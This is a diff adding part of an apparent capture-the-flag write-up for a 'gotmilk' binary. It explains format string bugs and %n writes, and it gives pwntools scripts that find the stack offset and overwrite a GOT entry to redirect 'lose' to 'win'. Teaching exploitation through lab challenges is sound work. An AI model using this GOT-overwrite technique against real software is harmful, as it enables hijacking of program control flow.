@@ -145,3 +145,115 @@ Your answer: 64 f7f6f580 804866f
 ```
 
 Look's like we got a format string vulnerability.
+
+This means that, since we're already able to push to the stack with the our
+input, we can likely write anywhere in memory by exploiting this `printf` call.
+This is because `printf` accepts the flag `%n`, which will write the number of
+characters printed thus far to the address argument associated with the flag.
+
+For example, consider the following code:
+
+```c
+int main(int argc, char ** argv) {
+    int a;
+    printf("123%n", &a);    // will print 123
+    printf("&d", a);        // will print 3
+    return 0;
+}
+```
+
+The value 3 will be written to `a` since 3 characters were printed before the
+`%n` in the first `printf` statement.
+
+This is useful for us, since it means we can overwrite values stored anywhere
+in memory with the number of characters printed so far. In our case we probably
+want to overwrite the `lose` function to execute the `win` function.
+
+To do so, we need to overwrite the value stored in the GOT for `lose` with
+address of the `win` function.
+
+> **Note:** the GOT is the Global Offset Table. It is used the dynamic linking
+> process to help us find where linked symbols are.
+
+Now all we have to do is figure out where the `GOT` entry for `lose` is, what
+the address for `lose` and `win` are in our library file, and overwrite the
+`GOT` entry for `lose` to contain the address of `win`.
+
+## Lets start pwning
+
+First lets figure out where our input is going going on the stack, so know what
+argument will contain the address of the `lose` entry we want to pass to `%n`
+in our print statement. We can do this by printing a bunch of `A`s followed by
+some flags and trying to find which argument our `A`s are:
+
+```python
+from pwn import *
+
+payload = b"A"*10
+
+for i in range(1,11):
+    payload += f" {i}:%x".encode()
+
+p = process('./gotmilk')
+p.sendline(payload)
+print(p.recv())
+```
+
+We get the following string printed:
+
+```
+1:64 2:f7f33580 3:804866f 4:0 5:ca0000 6:1 7:41414141 8:41414141 9:31204141 10:2078253a
+```
+
+It looks like the `A`s are the 7th argument (A in binary is 41)
+
+Now we need to figure out what the address of `win` and `lose` are in the
+library:
+
+```python
+from pwn import *
+
+lib = ELF('./libmylib.so')
+
+print(hex(lib.symbols['lose']))  # 0x11f8
+print(hex(lib.symbols['win']))   # 0x1189
+```
+
+It looks we'll just have to overwrite the last part of `lose`'s address to be
+`89` instead of `f9`.
+
+Lets try and do this now, first we need to get the address of `GOT` entry of
+`lose`, then we need to overwrite the last byte of `lose` to be `89` instead of
+`f9`.
+
+```python
+from pwn import *
+
+elf = ELF('./gotmilk')
+
+lose_got = elf.got['lose']
+pad_sz = 0x89 - 4  # minus 4 since lose_got address is 4 bytes
+arg_loc = 7
+
+
+payload = p32(lose_got)
+payload += f"%{pad_sz}x".encode()  # We need to pad our print with enough
+                                   # characters so that we print 0x89 characters
+
+payload += f"%{arg_loc}$hhn".encode()  # We say hhn instead of n to specify we
+                                       # only want to write 1 byte, not 4
+
+p = process('./gotmilk')
+p.sendline(payload)
+print(p.recv())
+```
+
+We get:
+
+```
+Out[1]: b'Simulating loss...\n\nNo flag for you!\nHey you! GOT milk? Your answer: \x10\x
+a0\x04\x08
+                                                     64\nMy bones\n'
+```
+
+Ladies and gentleman... we got milk.
